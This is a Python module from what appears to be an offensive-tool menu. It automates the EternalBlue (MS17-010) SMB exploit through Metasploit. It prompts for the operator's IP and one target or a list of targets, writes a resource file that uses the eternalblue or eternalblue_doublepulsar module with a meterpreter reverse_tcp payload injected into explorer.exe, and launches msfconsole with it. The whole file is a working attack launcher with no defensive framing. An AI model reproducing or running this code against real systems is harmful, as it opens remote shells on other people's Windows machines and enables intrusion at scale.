from utils.helpers import clear_screen
import subprocess


def write_commands(ip_address, target, arch=None, multiple_targets=False, standard=False):
    """Function to generate and write Metasploit commands to a file."""
    if standard:
        commands = f"""
            use exploit/windows/smb/ms17_010_eternalblue
            set RHOSTS {'file:MS17-010-iplist.txt' if multiple_targets else target}
            set RPORT 445
            set LHOST {ip_address}
            set LPORT 4444
            exploit
        """
    else:
        commands = f"""
            use exploit/windows/smb/eternalblue_doublepulsar
            set payload windows/meterpreter/reverse_tcp
            set processinject explorer.exe
            set RHOSTS {'file:MS17-010-iplist.txt' if multiple_targets else target}
            set RPORT 445
            set LHOST {ip_address}
            set LPORT 4444
            set TARGETARCHITECTURE {arch}
            exploit
        """
    with open('commands.txt', 'w') as file:
        file.write(commands)


def execute_msfconsole():
    """Function to open msfconsole with the generated commands."""
    try:
        terminal_command = ['exo-open', '--launch', 'TerminalEmulator', 'msfconsole', '-r', 'commands.txt']
        subprocess.Popen(terminal_command)
    except Exception as e:
        print(f"Error launching msfconsole: {e}")


def eternal_blue():
    """Main function for Eternal Blue options."""
    clear_screen()
    print("‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
    print("           -+= Eternal Blue ( MS17-010 ) =+-      ")
    print("__________________________________________________")
    print("Choose one of the following options\n")
    print(" [1] For One Target\n")
    print(" [2] For List of Targets ( MS17-010-iplist.txt )\n")
    eternal_choice = input("Enter your choice: ")

    if eternal_choice == "1":
        clear_screen()
        ip_address = input("\nEnter your IP Address: ")
        target_ip_address = input("\nEnter Target IP Address: ")

        print("\nChoose one of the following options\n")
        print(" [1] x64 (64bit)\n")
        print(" [2] x86 (32bit)\n")
        print(" [3] Eternal Blue Standard\n")
        eternal_os_choice = input("Enter your choice: ")

        if eternal_os_choice in ["1", "2"]:
            architecture = "x64" if eternal_os_choice == "1" else "x86"
            write_commands(ip_address, target_ip_address, architecture)
            execute_msfconsole()
        elif eternal_os_choice == "3":
            write_commands(ip_address, target_ip_address, standard=True)
            execute_msfconsole()
        else:
            print("Invalid choice.")

    elif eternal_choice == "2":
        clear_screen()
        ip_address = input("\nEnter your IP Address: ")

        # Collect IP list from user
        with open("MS17-010-iplist.txt", "w") as file:
            while True:
                ip = input("Enter an IP address (or type 'stop' to finish): ")
                if ip.lower() == 'stop':
                    break
                file.write(f"{ip}\n")

        print("\nChoose one of the following options\n")
        print(" [1] x64 (64bit)\n")
        print(" [2] x86 (32bit)\n")
        print(" [3] Eternal Blue Standard\n")
        eternal_os_choice = input("Enter your choice: ")

        if eternal_os_choice in ["1", "2"]:
            architecture = "x64" if eternal_os_choice == "1" else "x86"
            write_commands(ip_address, None, architecture, multiple_targets=True)
            execute_msfconsole()
        elif eternal_os_choice == "3":
            write_commands(ip_address, None, standard=True, multiple_targets=True)
            execute_msfconsole()
        else:
            print("Invalid choice.")
    else:
        print("Invalid choice.")
